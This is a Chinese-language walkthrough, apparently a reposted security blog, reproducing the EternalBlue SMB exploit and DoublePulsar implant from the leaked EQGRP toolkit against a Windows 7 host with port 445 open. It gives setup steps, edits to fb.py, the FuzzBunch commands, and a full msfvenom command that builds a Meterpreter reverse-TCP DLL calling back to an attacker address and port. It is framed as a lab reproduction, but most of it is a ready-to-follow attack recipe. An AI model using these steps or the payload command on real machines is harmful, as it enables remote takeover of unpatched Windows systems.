> 作者：边界安全
> [原文链接](https://mp.weixin.qq.com/s/RzGeOWdbvs-GOj6dAB9xgw##)

---

测试环境：

靶机：*windows7 64位旗舰版 **445 open***

攻击环境：
1. 下载并安装[python2.6](https://www.python.org/download/releases/2.6.6/)

2. 下载并安装[pywin32](https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download)

3. 将C:\Python26添加到环境变量PATH中。

下载 EQGRP_Lost_in_Translation，找到\windows\fb.py。

fb.py有个地方需要修改一下：

![](https://raw.githubusercontent.com/5cr1pt/img4markdown/master/Windows_SMB%E8%BF%9C%E7%A8%8B%E6%BA%A2%E5%87%BA0day%E5%A4%8D%E7%8E%B0/08.jpg)

第26,27,28行注释掉

![](https://raw.githubusercontent.com/5cr1pt/img4markdown/master/Windows_SMB%E8%BF%9C%E7%A8%8B%E6%BA%A2%E5%87%BA0day%E5%A4%8D%E7%8E%B0/06.jpg)


还有第72行。

打开cmd切入windows目录。执行python fb.py

![](https://raw.githubusercontent.com/5cr1pt/img4markdown/master/Windows_SMB%E8%BF%9C%E7%A8%8B%E6%BA%A2%E5%87%BA0day%E5%A4%8D%E7%8E%B0/03.jpg)


按照他的要求输入[默认]参数。

![](https://raw.githubusercontent.com/5cr1pt/img4markdown/master/Windows_SMB%E8%BF%9C%E7%A8%8B%E6%BA%A2%E5%87%BA0day%E5%A4%8D%E7%8E%B0/09.jpg)

然后use Eternalblue，一路回车：

![](https://raw.githubusercontent.com/5cr1pt/img4markdown/master/Windows_SMB%E8%BF%9C%E7%A8%8B%E6%BA%A2%E5%87%BA0day%E5%A4%8D%E7%8E%B0/01.jpg)


注意的是在这里选择1：

![](https://raw.githubusercontent.com/5cr1pt/img4markdown/master/Windows_SMB%E8%BF%9C%E7%A8%8B%E6%BA%A2%E5%87%BA0day%E5%A4%8D%E7%8E%B0/04.jpg)


一路回车就可以看到succeeded了。

接着执行use Doublepulsar。

![](https://raw.githubusercontent.com/5cr1pt/img4markdown/master/Windows_SMB%E8%BF%9C%E7%A8%8B%E6%BA%A2%E5%87%BA0day%E5%A4%8D%E7%8E%B0/02.jpg)


根据实际情况选择64位还是32位。

然后进入关键步骤：

![](https://raw.githubusercontent.com/5cr1pt/img4markdown/master/Windows_SMB%E8%BF%9C%E7%A8%8B%E6%BA%A2%E5%87%BA0day%E5%A4%8D%E7%8E%B0/05.jpg)


选择运行dll文件，然后输入dll文件的路径，这个dll文件我是用msf生成的。

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.171 LPORT=6666 -f dll > msfx64.dll

如果是32位的就生成32位的，如果弄错了也没事，工具会利用失败，重来就可以了。

然后一路回车：

![](https://raw.githubusercontent.com/5cr1pt/img4markdown/master/Windows_SMB%E8%BF%9C%E7%A8%8B%E6%BA%A2%E5%87%BA0day%E5%A4%8D%E7%8E%B0/07.jpg)


这样子就是成功了。看看msf：

![](https://raw.githubusercontent.com/5cr1pt/img4markdown/master/Windows_SMB%E8%BF%9C%E7%A8%8B%E6%BA%A2%E5%87%BA0day%E5%A4%8D%E7%8E%B0/0.jpg)
